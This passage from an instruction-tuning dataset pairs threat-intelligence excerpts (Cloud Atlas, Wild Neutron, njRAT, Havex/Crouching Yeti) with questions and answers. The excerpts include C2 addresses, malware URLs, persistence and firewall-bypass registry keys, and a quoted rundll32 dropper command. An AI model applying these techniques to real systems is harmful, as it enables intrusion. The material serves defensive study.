2d8a9038e151fb30d45ea8668afd2a8e\tat 2011\u00ad08\u00ad15 13/34/31 UTC \u00adVirusTotal.\t Retrieved February\t03,\t 2012,\t from VirusTotal: https://www.virustotal.com/file/76747e708d79925ba0817d48c96f4c85938bfe3f0f5b681ff204a09bd3e bc1cc/analysis\nHispasec Sistemas.\t (2011,\t August 19).\t Antivirus scan for\t 461884f1d41e9e0709b40ab2ce5afca7 at 2011\u00ad08\u00ad19 13/31/35 UTC.\t Retrieved February 02,\t 2012,\t from\t VirusTotal: https://www.virustotal.com/file/74455d5e8f99272aec64bce106b1e8ff39a122a7d27d362a274af31ab5 a4fb1fe\nHispasec Sistemas.\t (2011,\t November 06).\t Antivirus\tscan for\t 5fce1fc18283d76c396a3ccc64bdbbde\tat 2011\u00ad11\u00ad06 09/44/14 UTC.\t Retrieved January\t30,\t 2012,\t from\t VirusTotal: https://www.virustotal.com/file/4dc0c7d8d84838c9b209ea727bd4ab7471a88fba55b786f7e37ce6394 565b6aa/analysis\nHispasec Sistemas.\t (2011,\t November 08).\t Antivirus\tscan for\t 754364d9db702dc715327b40bf97e556 at 2011\u00ad11\u00ad08 18/29/09 UTC.\t Retrieved January\t30,\t 2012,\t from\t VirusTotal: https://www.virustotal.com/file/781c30714ff5304b7e9530ec879ef4ed7e94a0138537563b4c12b158c7 bcab40/analysis\nHispasec Sistemas.\t (2011,\t May\t 10).\t VirusTotal\t \u00adFree \tOnline\tVirus, Malware and URL Scanner. Retrieved December 30,\t 2011, from\t VirusTotal:\t http://www.virustotal.com/report.html?id=5e29960ba0bb544623b52e5db592242f30c05ca1336ec667 d0a162b9a7584f90\nHispasec Sistemas.\t (2011,\t November 21).\t VirusTotal\t \u00adFree\tOnline Virus, Malware and URL Scanner.\t Retrieved\t December 30,\t 2011, from\t VirusTotal: \thttp://www.virustotal.com/file\u00adscan/report.html?id=deb83be93eb74a66b8c654ddb28c3a1c58ee89abf3a72ce616755deb6f9902c\u00ad1321864468\nHispasec Sistemas.\t (2011,\t December 21).\t VirusTotal\t \u00adFree\t Online Virus, Malware and URL Scanner.\t Retrieved\t December 30,\t 2011, from\t VirusTotal: \thttp://www.virustotal.com/file\u00adscan/report.html?id=251b196f94d6a858941cb2e18b6879fc2d3f4ef580a8cae338f42e7776229fc\u00ad1324454798\nHispasec Sistemas.\t (2011,\t May\t24). VirusTotal\t \u00adFree \tOnline\tVirus, Malware and URL Scanner. Retrieved January\t04,\t 2012,\tfrom VirusTotal: http://www.virus\u00adscan/file\u00adscan/report.html?id=5999da598ee19708c997e77650b0b423c0337ebff16c6ad7d929fc3a84f10f13\nKaspersky\tLab ZAO.\t (2010,\t January 12).\t Backdoor.Win32.Agent.anvj. Retrieved December 09, \t2011,\tfrom Securelist: http://www.securelist.com/en/descriptions/7440365/Backdoor.Win32.Agent.anvj\nKurc,\t D. (2011, April 17).\t Encyclopedia entry: TrojanDropper:Win32/Redsip.A\t \u00adLearn more\tabout malware \u00adMicrosoft Malware Protection Center.\t Retrieved January\t 25,\t 2012, from\t Microsoft Malware Protection Center: http://www.microsoft.com/security/portal/threat/Encyclopedia/Entry.aspx?Name=Trojan.Dropper%3 AWin32%2FRedsip.A\nLelli,\t A.\t (2010,\tMarch\t12).\t Zero\u00adDay\t Attack\t on IE6 \u00adJS.Sykipot Doesn't Spare Retired Software.\t Retrieved February 01,\t 2012, from\t Symantec Connect\t Community:\thttp://www.symantec.com/connect/blogs/zero\u00adday\u00adattack\u00adie6\u00adjssykipot\u00addoesn\u00adt\u00adspare\u00adretired\u00adsoftware\nMalware Domains.\t (2012, January\t16). Malware Domains.\t Retrieved January\t30, 2012,\t from\t Malware Domains:\t http://mirror1.malwaredomains.com/updates/20120116.txt\nMalwareGroup.com.\t(n.d.).\t 209.53.155.244 \t|\t Ipaddress .\t Retrieved\t January 18,\t 2012,\t from\t MalwareGroup: http://www.malwaregroup.com/ipaddresses/details/209.53.155.244\nMcAfee Foundation Professional Services and\t McAfee Labs.\t (2011, February 10).\t Global\t Energy\t Cyberattacks: \"Night Dragon\". Retrieved June 13,\t2011,\t from\t McAfee:\thttp://www.mcafee.com/us/resources/white\u00adpapers/wp\u00adglobal\u00adenergy\u00adcyberattacks\u00adnight\u00addragon.pdf\nMcAfee Inc.\t(2011,\t December 22).\t Backdoor\u00adFCQ \u00adMalware \u00adMcAfee\t Labs Threat Center.\t Retrieved February 02,\t 2012,\tfrom McAfee Labs Threat\t Center: http://www.mcafee.com/threat\u00adintelligence/malware/default.aspx?id=670739\nMendoza,\t E.\t (2011). TROJ_INJECT.AMR \t| Low Risk | Trend Micro\t Threat Encyclopedia. Retrieved November 21,\t 2011,\tfrom Trend\t Micro:\thttp://about\u00adthreats.trendmicro.com/malware/aspx?language=au&name=TROJ_INJECT.AMR\nMicrosoft.\t (2007,\tDecember 10). A description of Svchost.exe\t in Windows XP Professional Edition. Retrieved\t September 07,\t 2011,\t from\t Microsoft\t Support: http://support.microsoft.com/?kbid=314056\nMicrosoft\t Corporation.\t (2011,\t September 07). Locales\tand Languages (Windows).\t Retrieved January 24, 2012, from Microsoft\t Software Development\t Network:\thttp://msdn.microsoft.com/en\u00adus/library/dd318716.aspx\nMicrosoft\t Corporation.\t (2011,\t September 07). OSVERSIONINFOEX structure.\t Retrieved\t January\t17, 2012, from\t Microsoft\t Software Development\t Network:\thttp://msdn.microsoft.com/en\u00adus/library/windows/desktop/ms724833(v=vs.85).aspx\nMicrosoft\t Corporation.\t (2011,\t September 07). SYSTEM_INFO structure.\t Retrieved\t January\t24,\t 2012,\t from\t Microsoft\t MSDN: http://msdn.microsoft.com/en\u00adus/library/windows/desktop/ms724958(v=vs.85).aspx\nMullaney,\tC.\t(2011, July\t30).\t Backdoor.Sogu Technical\t Details\t| Symantec.\t Retrieved\t August 18,\t 2011,\t from\t http://www.symantec.com/security_response/writeup.jsp?docid=2011\u00ad073003\u00ad5345\u00ad99&tabid=2\nParkour,\t M. (2011, July\t05). contagio: Jul 5\tCVE\u00ad2010\u00ad2883\tPDF invitation.pdf with Poison Ivy from 112.121.171.94 | pu.flower\u00adshow.org. Retrieved January 28, 2012, from\t Contagio:\t http://contagiodump.blogspot.com/2011/07/message\u00adtargeting\u00adexperts\u00adon\u00adJapan.html\nParkour,\t M. (2011, July\t14). Jul 13 CVE\u00ad2010\u00ad2883 PDF Meeting Agenda with more Poison Ivy\t www.adv138mail.com |\t 112.121.171.94. Retrieved\t September 22,\t 2011, from Contagiodump\t Blog: http://contagiodump.blogspot.com/2011/07/jul\u00ad13\u00adcve\u00ad2010\u00ad2883\u00adpdf\u00admeeting\u00adagenda.html\n\nHow did the attackers manage to exfiltrate data from SK Communications during the hack, and what methods were employed to control the malware?",
    "output": "The attackers managed to exfiltrate data from SK Communications by infecting multiple computers with malware that could receive command and control (C2) instructions. Once the malware was installed, it communicated with C2 servers located at specific IP addresses obtained through DNS resolution. The C2 servers provided additional instructions to the malware, allowing the attackers to control the malware and extract sensitive data from the infected systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: A CUNNING MENAGERIE IN THE WILD\nIn order to delve into specific examples, we require two distinct allowances from the reader:\n\u2022 The first regards the use of attribution examples. As should have become apparent by now, attribution claims are far from certain and often sparsely substantiated. As part of a company and a research team that is cautious to remain attribution agnostic, we toe this line respectfully and with good reason. In the process of discussing in-the-wild examples of manipulation of attribution leads, it may be necessary to point to commonly held beliefs or rumours as to the provenance of certain threat actors in order to showcase where the indicators falter. We ask the reader to treat these as what they are: rumours heard through the attribution grapevine, the sort of RUMINT that associates a threat actor with a country, region, or organization. These are not our own assertions or claims. We remain steadfast in our conviction of the complexities of the attribution problem and would prefer not to be quoted by overzealous readers as asserting attribution claims that are not our own. At times our own research may support these intuitions but we do not go so far as to make these attribution claims our own.\n\u2022 Secondly, despite the liberties provided by an academically toned industry publication, we remain bound by corporate realities, respect for the research methods of collaborators, and, most of all, legal constraints. As such, we may not always be able to provide full disclosure of indicators involved in certain findings. As we do not seek to recreate the process of each investigation, we feel these are not vital to convey the main thrust of our argument, which is that intermediate-to-advanced threat actors are aware of attribution methods and are already attempting to manipulate researchers to expend limited resources chasing ghost leads. Where gaps arise, let us relegate these accounts to camp fire re-tellings among friends.\nWe thank the reader for these allowances, providing a lacuna between authors and content, in order to further a wider discussion about the complexities of attribution that could not happen otherwise.\nMedium Headline: On language \u2013 Cloud Atlas\nIn December 2014, Blue Coat exposed a newly discovered malware framework dubbed 'Inception' [4, 5], which was later attributed to a new actor named 'Cloud Atlas' [6]. Cloud Atlas is believed to have been born from a previous actor tracked as 'Red October' [7]. Whether Cloud Atlas is the same actor or a spin-off of the original, this case posed some interesting analytical problems when it came to attribution. The current belief is that both teams are likely Eastern European-based and most likely Russian-speaking. Cloud Atlas may be a spin-off from the original group following conflicts arising from the annexation of Crimea in the spring of 2014.\nDuring the investigation of this new campaign, various oddities were discovered that seemed to disprove the belief that Cloud Atlas was Eastern European. It was only after analysing these breadcrumbs in conjunction with each other that the determination was made that Cloud Atlas was most likely 'muddying the water' in order to make attribution more diffi cult. Targeting seemed to fit the original campaign, as the majority of attacks were heavily focused on Russia, specifi cally government and diplomatic entities. Very similar, if not identical lure documents were used in the two campaigns. Also, the implementation of compression algorithms was nearly identical in both, with the Cloud Atlas version showing slight improvement. But this is where the similarities stop, and the weirdness starts:\nOne of the early lure documents discovered in this campaign pertained to Russian government officials but was titled in Spanish. Further analysis of metadata from the original lure document showed it was created on a native Spanish speaker's system. Initially, this caused a bit of confusion, but it was later determined that the lure document was most likely stolen from an advisor in the Spanish Embassy in Moscow and repurposed for use in attacks.\nThe infrastructure used by Cloud Atlas to manage victim data and implants was also interesting. The actors used a large pool of IP addresses in a 'round robin' fashion to access the cloud-based provider used to host payloads and store exfi ltrated data. Geolocation of the IP addresses showed the actors as mainly originating from South Korea. Later analysis revealed that these IP addresses were mostly compromised home routers which contained a small proxy implant.\nFocusing on language clues left behind in the malware caused further attribution issues, as conflicting indicators were peppered into the mobile implants:\n\u2022 Arabic strings in the BlackBerry version\n\u2022 Hindi characters in the Android version\n\u2022 God_Save_The_Queen was found in the BlackBerry version\n\u2022 'JohnClerk' was found in the project path for the iOS version\nThe presence of these various conflicting strings in different versions of the malware could either mean that the actors borrowed code from various sources to use in their implants, or that the strings were purposely placed to misguide researchers.\nDuring the investigation, many researchers were running the various samples found in the wild in an effort to solicit a second-stage binary from the actors. In multiple instances, an implant was served up to researcher machines that did not fi t the typical Cloud Atlas framework. This implant showed characteristics of malware traditionally considered Chinese and used a command-and-control domain that was inactive at the time. The belief is that the actors recognized researcher systems in their logs and instead of serving the normal second-stage binary, they instead provided a 'fake', unrelated piece of malware to cause confusion.\nBlue Coat researchers did an excellent job in their original paper describing the various paths attempted for attribution, only to hit a dead end or to find nonsense data. This is a great example of\nhow certain APT actors are aware of the indicators we as researchers tend to latch onto, and are already purposely modifying those characteristics.\nMedium Headline: On tasking \u2013 Wild Neutron\nWild Neutron3 is a crowd favourite when it comes to complicated attribution research, complete with apocryphal tales and red herrings. Wild Neutron first rose to prominence in 2013 [8], though evidence shows the group was active as early as 2011. Their reputation is in large part thanks to their ambitious targeting, bagging whales like Apple, Facebook, Microsoft and Twitter. Their arsenal included multi-platform malware [9], a Java zero-day (CVE20130422), and a penchant for well-chosen watering-hole sites. After close to a year of silence, Wild Neutron returned for a 2015 campaign, this time with a stolen digital certificate and a still undiscovered Flash zero-day exploit. Throughout, attribution has been a maze of contradictory indications and false starts that continue to elude researchers.\nSome of the simpler misleads are found in the Windows malware where language strings were found both in Romanian ('la revedere' meaning 'goodbye') and Russian ('uspeshno', a transliteration of 'successfully'). Other leads include a false connection to a well known researcher, connections to apparent scam artists, investment funds, and even a seemingly successful cryptocurrency scam4. But Wild Neutron presents a deeper challenge for analysts than this particular hodgepodge of indicators, one that speaks to the possible nature of the threat actor as a mercenary entity. Usually a situation so convoluted would find some semblance of resolution by looking at the victim spread, the sort of organizations and entities targeted by the threat actor. In this case, the victim spread does little to assuage our uncertainty.\nLooking at Wild Neutron's targeting, no one clear nexus of interest is apparent:\n\u2022 Large company groups involved in M&A\n\u2022 Real estate companies\n\u2022 Bitcoin-related companies\n\u2022 Investment fi rms\n\u2022 IT companies\n\u2022 Healthcare companies\n\u2022 Law fi rms\n\u2022 Developers (iOS and Linux)\nWith victims in over 11 countries5 and multiple verticals, we can perhaps assume several different and possibly overlapping nexuses of interest that may suggest multiple tasking entities or diverging mission imperatives. Another noteworthy observation\nis the lack of victims in diplomatic or government institutions, a customary vertical for a threat actor of this calibre. This stands in juxtaposition to what is presumably counterterrorism tasking with the compromise of the Ansar alMujahideen forum. Researchers concluded that the tasking was in line with a mercenary arrangement, taking tasking from different entities and imperatives, including a financial incentive to pilfer tradeable financial information on mergers and acquisitions. This type of threat actor, while unlikely to remain rare, by its very nature dismantles our ability to form a generalized attributory claim on the basis of tasking alone.\n3 Also known as: Morpho, Butterfly, ZeroWing, or Jripbot.\n4 These attributory hypotheses and the supporting indicators are presented in the Kaspersky Private Intel Report on Wild Neutron pushed to subscribers in July 2015.\n5 Visibility courtesy of the Kaspersky Security Network (KSN) and Kaspersky sinkholes of Wild Neutron command-and-control infrastructure.\n\nBased on the above text, answer a question. How did the Cloud Atlas threat actor attempt to mislead researchers regarding their true origin?",
    "output": "The Cloud Atlas threat actor employed several tactics to mislead researchers about their origin. They used lure documents in Spanish, which were actually stolen from an advisor in the Spanish Embassy in Moscow. Additionally, they utilized a pool of compromised home routers primarily located in South Korea to manage their infrastructure. Furthermore, they included conflicting language strings in their malware, such as Arabic, Hindi, and English phrases, to create confusion. Lastly, they served fake, unrelated malware to researcher machines to throw off investigations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Overview\nMalware authors are not shy about borrowing ideas. One of the most typical cases is the Tomato Garden case,1 where several different groups used the same zero-day Microsoft Word exploit. The term \"used\" means that they somehow get hold of a document that exploited the vulnerability, and then left the exploiting document part and the shellcode intact, only changed the appended encrypted executable at the end, and immediately they had what needed.\nSomething very similar happened just recently, in August and September of 2014.\nI always wanted to know how the malware writing groups worked. I mean the really serious ones, the ones behind Chinese state-sponsored APT attacks, or the groups behind high profile common malware, like Zeus.\nThis case offers another piece of insight. There must have been a staff meeting, where the manager prompted that, in the next malware distribution campaign they should not only use the aging CVE-2012-0158 vulnerability, but the newer CVE-2014-1761 as well. The rest of the document will detail how some of the groups coped with this task.\nClearly, the malware authors took a sample somehow and started the implementation process. I wasn't there, of course, so what follows is an educated guess based on the samples.\n\nAnswer this question based on the above context: How did the malware authors involved in the 'Tomato Garden' case leverage existing vulnerabilities, and what does this imply about the collaboration and resource sharing among different threat groups?",
    "output": "In the 'Tomato Garden' case, malware authors leveraged existing vulnerabilities by obtaining a document that exploited a zero-day Microsoft Word vulnerability. They kept the exploiting document part and the shellcode intact but replaced the appended encrypted executable at the end with their own. This approach allowed them to quickly create new malware variants without developing the exploit from scratch. This implies that different threat groups collaborate and share resources, potentially acquiring exploits from each other or through common sources. Such resource sharing enables rapid adaptation and deployment of new attack vectors, highlighting the interconnected nature of advanced persistent threat (APT) operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the APT group UNC2970 utilize Process Injection: Dynamic-link Library Injection techniques to evade detection and execute malicious code in the context of the LIGHTSHOW-1 campaign?",
    "output": "Process Injection: Dynamic-link Library Injection is a technique used by adversaries to inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses and possibly elevate privileges. In the context of the LIGHTSHOW-1 campaign, the APT group UNC2970 utilizes a variation of this technique, specifically DLL sideloading, to execute malicious code. According to the report, PLANKWALK, a backdoor written in C++, utilizes multiple layers of DLL sideloading to execute an encrypted payload. Additionally, TOUCHSHIFT, a malicious dropper, leverages DLL Search Order Hijacking to load and execute itself. This technique allows the attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk, evading detection from security products. Furthermore, SIDESHOW, a backdoor written in C/C++, supports payload execution via process injection, which may also utilize DLL injection techniques. Overall, UNC2970's use of Process Injection: Dynamic-link Library Injection techniques demonstrates their sophisticated approach to evading detection and executing malicious code.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Summary\nThe \"Authorization.exe\" malware sample was created with version V.0.5 of this RAT. The njRAT application was developed with VB.NET (Visual Basic .NET).\nWhen the malware connects to the Command & Control (CnC) server, the attacker is able to perform the following actions from the njRAT CnC server GUI:\n- Open a 'File Manager' window to manipulate files\no This window allows the attacker to Upload & Download, Run, Delete, Edit, Rename, Copy, Cut, Paste, and Empty files.\no The window also allows the attacks to create new folders in the Victim system\n- Open a 'Run File' window\no This window allows the attacker to upload a file, or provide a link to a file to run in the Victim system\n- Open a 'Remote Desktop' window\no When selected, it opens a live window of the Victim's user desktop\n- Open a 'Remote Cam' window\no This window allows the attacker to obtain access to the Victim's system camera to see the Victim user\n- Open a 'Remote Shell' window\no This window opens a reverse shell window and allow the attacker to perform all the activities possible from the command prompt\n- Open a 'Process Manager' window\no This window allows the attacker to Refresh the process list, Kill processes, Suspend processes, Resume processes\n- Open a 'Registry' window\no This window allows the attacker manipulate the Victim's system registry (edit, delete, create keys and values)\n- Open a 'Keylogger' window\no When this option is selected, the keylogger file is automatically uploaded from the Victim system into the attacker's machine\n- Open a 'Get Passwords' window\no This window appears to collect all the passwords stored by the browser (User, Password, URL, App). At the moment of writing this report, the functionality was not confirmed. When the option is selected, the malware searches Mozilla Firefox, Google Chrome, Opera directories.\n- Open a 'Server' window\no This window allows the attacker to Update, Uninstall, Restart, Close, Disconnect, or Rename the malware running in the Victim system\n- Open an 'Open Folder' window\no This window open the local folder in the attackers machine in which the artifacts collected through the \"njRAT\" GUI are stored in his/her system\n- Open a 'Builder' Window\no This window allows the attacker to build new Clients to be deployed to Victims or used in attack campaigns. Some of the options in this builders allows the attacker to configure:\n\u25aa C2 node IP\n\u25aa C2 node port\n\u25aa Vic Tim Name (Looks like this could be used to identify the attack campaign)\n\u25aa Malware name (when it makes a copies itself)\n\u25aa Directory to make a copy of the malware when it is executed\n\u25aa Capabilities to spread via USB\n\u25aa Select the malware icon\n\u25aa Protect the malware process\n\u25aa Stub Randomization\nThe following is a screenshot of the \"njRAT\" v.0.5 CnC GUI when a Victim system connects to it:\nThe following \"About\" information was observed in this version (0.5.0) of the C2 server software found online:\nThe following screenshot shows the Builder interface and default parameters:+1800.652.4020\nThe \"Authorization.exe\" malware has keylogger functionality. It stores the logged keystrokes in the following file: \"[CWD]\\.tmp\". When the malware is dropped by the \"Authorization form may - 2013 - 115444.scr\" carrier file, the logged keystrokes are stored in: \"C:\\Extracted\\.tmp\".\nThe IP address used by the Command & Control (C2) node appears to be under an IP range owned by: \"Palestinian Internet Services, P. O. BOX 5111 Gaza City, Palestine\".\nVariants of this malware have been observed by the community since at least 2012. The malware appears to be known by the community as: njRAT, MSIL/Bladabindi, and Backdoor.LV.\nWhen the \"Authorization.exe\" malware is executed it:\n- Creates a copy of itself in the following locations:\no %APPDATA%\\msnco.exe\no C:\\Documents and Settings\\%USERNAME%\\Start Menu\\Programs\\Startup\\b6554e5bcfef391ff7a7ffda58092e10.exe\n- Tries to open the following file: [CWD]\\ Authorization.exe.config\n- Entrenches in the system for persistence in the following registry locations:\no HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Ru n\\b6554e5bcfef391ff7a7ffda58092e10\no HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\R un\\b6554e5bcfef391ff7a7ffda58092e10\nMakes the following modifications to the registry to bypass the Windows Firewall:\no Key: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAcc ations\\List\\[%APPDATA%]\\msnco.exe +1800.652.4020ess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplic\no Value: [%APPDATA%]\\msnco.exe:*:Enabled:msnco.exe\n- Beacons to the following C2 node over TCP port 1177: \"217.66.231.245\"\nThe attacker tries to make sure the malware will run in the system by making the second copy into the above mentioned directory (C:\\Documents and Settings\\%USERNAME%\\Start Menu\\Programs\\Startup\\b6554e5bcfef391ff7a7ffda58092e10.exe)\no This causes the malware to execute again when the system is rebooted and re-starts the infection in the system. Once the system is infected again, it will beacon to the C2 node.\nThe attacker tries to trick the user by using different icons for the malware. Various samples were observed with MS Word and PDF icons. The following is a screenshot of how the file will look like to a normal user:\nWhen the system is configured to show file extensions, the EXE extension is now revealed:\nWhen the malware connects to the C2 node, it will send information about the victim system, malware version, open windows, etc. The following is the network traffic observed:\nlv|'|'|TndfQzQyNjRFQkI=|'|'|VICTIM|'|'|Examiner|'|'|2013-06-21|'|'|USA|'|'|Win XP ProfessionalSP2 x86|'|'|No|'|'|0.5.0E|'|'|..|'|'|Y3B0YnRfUHJvY2Vzc19SZWdpc3RyeV9GaWxlX0luZm8ubG9nIC0gTm90ZXB hZA==|'|'|[endof]act|'|'|\nY3B0YnRfUHJvY2Vzc19SZWdpc3RyeV9GaWxlX0luZm8ubG9nIC0gTm90ZXBhZA== [endof]\nInformation sent by the attacker on opened windows in the system could inform him/her of his malware being analyzed and allowed to connect to the C2 node. For example, if Wireshark, Filemon, Regmon, and IDA are opened in the system when the analyst executes the malware, this will quickly let the attacker know that someone is performing reverse engineering of his malicious code.\nThe following WHOIS information was found related to the C2 node (217.66.231.245): inetnum: 217.66.228.0 - 217.66.231.255 netname: AV_FXD_RA descr: AV_FXD_RA +1800.652.4020\nThe \"Authorization.exe\" variant in this report appears to have been available at some point through the following URL: \"hxxp://bongdacongdong.vn/authorization.exe\". The domain currently resolves to the following IP address: \"112.213.89.144\", but at+1800.652.4020@FidSecSys some point, the domain was associated with the following IP address: \"31.170.165.90\".\nThe following information was found at Virustotal for \"31.170.165.90\":\n- Passive DNS replication\nThe following domains resolved to the given IP address:\n- Latest detected URLs\nLatest URLs hosted in this IP address detected by at least one URL scanner or malicious URL dataset: 3/38 2013-06-09 08:16:23 hxxp://www.saldo-dobrado.id1945.com/sodexo2013/dobro.htm\n2/38 2013-06-05 15:15:03 hxxp://yandload.besaba.com/\n3/38 2013-06-04 02:08:18 hxxp://bongdacongdong.vn/authorization.exe\n4/38 2013-05-30 21:34:09 hxxp://yandload.besaba.com/index.php?f=rubinrot.exe\n5/39 2013-05-24 17:36:28 hxxp://indonesiancode.p.ht/\n2/36 2013-05-10 04:50:52 hxxp://yandload.besaba.com/index.php%3F\n2/37 2013-04-30 05:06:15 hxxp://yandload.besaba.com/index.php%5B%2A%2Aqmark%2A%2A%5D\n2/37 2013-04-29 22:23:55 hxxp://php6.besaba.com/install_flashplayer11x32_mssd_aih.exe\n2/36 2013-04-27 09:14:33 hxxp://aw.nation-sim.net/ips_kernel/sabre/Sabre/DAV/FS/option.php 1/36 2013-04-22 21:56:09 hxxp//alexis.id1945.com/\n- First submission:\n2013-05-28 at 00:12:24\n\nWhat capabilities does the njRAT Command & Control (CnC) server GUI offer to the attacker, and how can these functionalities be leveraged for further attacks?",
    "output": "A: The njRAT CnC server GUI offers a wide range of functionalities to the attacker, including the ability to open a 'File Manager' to manipulate files, a 'Run File' window to execute files, a 'Remote Desktop' window for live access to the victim's desktop, a 'Remote Cam' window to access the victim's webcam, a 'Remote Shell' window for command prompt access, a 'Process Manager' window to manage processes, a 'Registry' window to manipulate the system registry, a 'Keylogger' window to retrieve logged keystrokes, a 'Get Passwords' window to collect stored browser passwords, a 'Server' window to manage the malware, an 'Open Folder' window to access collected artifacts, and a 'Builder' window to create new clients. These functionalities can be leveraged for further attacks by allowing the attacker to exfiltrate data, escalate privileges, move laterally within the network, and maintain persistent access to the victim's system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 2. Analysis\nThis section analyzes all the aspects we could find about how this actor performs its campaigns.\nThe Crouching Yeti actor performed a massive surveillance operation targeting strategic victims, many of them in the industrial/manufacturing sector.\nThere were different ways of delivering of its malware including waterholing, spearphishing and adding malware to legitimate installers. Once the victims were infected, Crouching Yeti selected different RATs for its operations. These RATs communicated with Command and Control servers on compromised servers around the world, using a simple PHP backend.\nWe were able to identify several victims, including high-profile ones and dozens of domains used in the campaign.\nSmall Headline: 1. Legitimate software installers\nThe first method uses a legitimate software installer repackaged to contain the malicious DLL. Such modified self-extracting archives could have been uploaded directly to a compromised server, replacing the original file, or sent to the victim by email.\nOne example of this method was a hijacked SwissRanger camera driver (libMesaSR version 1.0.14.706) that was used to drop the Sysmain backdoor to:\nand set the Run registry value to load malicious DLL upon next system startup.\nIn a similar manner, as early as January 2014, Havex version 038 appears to have been dropped by a legitimate ~40MB software installer from the eWon web site:\nhxxp://www.ewon.biz/software/eCatcher/eCatcherSetup.exe\n\u2022eWon\u2022 is a Belgian producer of SCADA and industrial network equipment, which helps define this attack method as a watering hole attack:\n\u2022Breaking the barrier between industrial applications and IT standards, the mission of eWON is to connect industrial machines securely to the Internet, enabling easy remote access and gathering all types of technical data originating from industrial machines...Connecting machines across the Internet is our mission.\u2022\nSometimes, the Havex loader was dropped from \u2022eCatcherSetup_v4.exe\u2022, so it seems that the site operators may have removed a previous file and the attackers replaced it with their trojanized installer, and so on. Likely, the attackers gained access to eWon\u2022s ftp site and replaced the legitimate file with one that is bound with the Havex dropper several times.\nAnother example that involves a hijacked application from a PLC-related vendor is a Trojanized mbCHECK installer which replaced the original legitimate version freely downloadable from the vendor's website. The legitimate version can be downloaded for free from the vendor\u2022s website. The vendor - MB Connect Line - is a company which specializes in software for remote maintenance of PLC systems: MB Connect Line GmbH(hxxp://www.mbconnectline.com/index.php/en/).\nIn this case, the dropped DLL was Havex version 043.\nSmall Headline: 2. Malicious XDP file \u2022 spear-phishing\nThe second method relies on a malicious XDP file containing the PDF/SWF exploit (CVE-2011-0611) and was most probably used in spear-phishing attacks. This exploit drops the Havex loader DLL, which is stored in an encrypted form in the XDP file.\nThe exploit is delivered as an XDP file (XML Data Package) which is actually a PDF file packaged within an XML container. This is a known the PDF obfuscation method and serves as an additional anti-detection layer.\nThe XDP file contains an SWF exploit and two files (encrypted with XOR) stored in the invalid section of the PDF. One of the files is Havex DLL (version 038), the other is a small JAR file which is used to copy and run the DLL by executing the following command:\ncmd /c copy <fname_passed_as_param> %TEMP%\\\\explore.dll /y & rundll32.exe %TEMP%\\\\explore.dll,RunDllEntry\nSWF executes the action script, which contains another SWF file which in turn uses the CVE-2011-0611 vulnerability to run the shellcode.\nThe shellcode then looks for a specific signature in the memory (which signs the start of encrypted DLL), decrypts and loads it.\nSmall Headline: 3. Malicious JAR/Html files \u2022 waterholing\nFinally, this actor actively compromises legitimate websites for watering hole attacks. These hacked websites in turn redirect to malicious JAR or html files hosted on other sites maintained by the group (exploiting CVE-2013-2465, CVE-2013-1347, and CVE-2012-1723 in Java 6, Java 7, IE 7 and IE 8), which then drop the Havex loader, the Karagany backdoor and helper tools. These sites run an exploit kit known as \u2022LightsOut\u2022.  It appears that the \u2022LightsOut\u2022 exploit kit is exclusively used by Energetic Bear/Crouching Yeti.\nFrom the dozens of Yeti exploit sites we reviewed, the malicious code was nothing more than slightly modified metasploit java exploits delivering the Havex loader. Some sort of internal review must have pushed them towards the LightsOut EK. KSN data records help provide a list of Crouching Yeti related exploit delivery from dozens of these sites.\nIn earlier cases (July 2013), successful Java exploitation served from nahoonservices.com would cascade into more Yeti components planted on victim systems. The java exploit downloaded Karagany backdoors, which in turn downloaded stealers from 91.203.6.71:\nKsn data recorded at least 20 victim sites that were compromised and injected with Yeti iframes, redirecting hundreds of visitors to compromised Yeti exploit sites. Most of these redirector sites were owned by western and Eastern European power players, investors, legal advisors and advocates, and European and US industrial IT equipment makers. The compromised sites hosting the LightsOut Exploit Kit were fairly trafficked, legitimate sites. Their content varies widely, from California winemakers to Cuban travel agencies and Iranian general interest/religious inspiration sites.\nFinally, other second stage tools were simply retrieved by the downloaders over http from various servers. Some of these Yeti sites, like kinoporno.org, served both Havex and these tools. KSN events recorded the sites serving Windows Credential Editor and custom credential and document stealing tools.\nVery Small Headline: 1. Description\nThe main functionality of this component is to download and load additional DLL modules into the memory. These are stored on compromised websites that act as C&C servers. In order to do that, the malware injects itself into the EXPLORER.EXE process, sends a GET/POST request to the PHP script on the compromised website, then reads the HTML document returned by the script, looking for a base64 encrypted data between the two \"havex\" strings in the comment tag <!--havexhavex--> and writes this data it to a %TEMP%\\<tmp>.xmd file (filename is generated by GetTempFilename function).\nIn the meantime, another routine is constantly checking the %TEMP% folder for all *.xmd files. For each file it finds, it decompresses the content, decrypts (if encrypted) and loads into the memory as the DLL.\nIn order to run on each system boot, malware copies itself to: <path>\\TMPprovider0XX.dll and creates the autorun registry key.\nAll samples of this component contain a statically linked bzip2 library. Versions >= 01B also contain an RSAeuro library, used to encrypt log files and decrypt downloadable modules. Public keys for encryption are hardcoded in the binary and/or stored in the configuration section. In some cases, these keys are written to the registry values.\nIn total, we identified 124 different samples of Havex loaders, belonging to 27 different versions. As of June 2014, the latest version number we have is 044.\nVery Small Headline: 2. C&C communication\nThe URL addresses of the C&C servers (which are indeed compromised websites) are either hardcoded in the binary, or - in versions => 038 - specified in the configuration section inside the ICT resource. This resource is compressed with bzip2 and encrypted with XOR.\nThere are usually 2-4 URLs per binary, different for each malware version and sometimes also different between samples of the same version.\nMalware sends a GET request (versions <  017) or POST request to the first available URL. The request contents depends on the malware version and it may include such information as unique bot id, malware version number, OS version number, and some other data from configuration, as well as the harvested information logged into the *.yls file (if any). Then the malware searches the HTML code of each returned page for havex markers and saves the data between the markers into a temporary file.\nVery Small Headline: 3. Downloadable modules - common characteristics\nThese modules 